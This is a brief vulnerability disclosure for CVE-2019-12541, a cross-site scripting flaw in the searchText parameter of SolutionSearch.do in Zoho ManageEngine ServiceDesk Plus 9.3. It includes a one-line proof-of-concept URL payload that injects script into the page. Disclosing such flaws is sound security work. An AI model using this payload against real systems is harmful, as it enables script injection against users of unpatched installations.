# CVE-2019-12541 Zoho ManageEngine ServiceDesk Plus 9.3 XSS vulnerability in SolutionSearch.do
Information Description: An issue was discovered in Zoho ManageEngine ServiceDesk Plus 9.3. There is XSS via the SolutionSearch.do searchText parameter. 

**Author: Concobe of Tarantula Team - VinCSS (a member of Vingroup)**

# Payload 
domain/SolutionSearch.do?searchText=1'%3balert('XSS')%2f%2f&selectName=Solutions
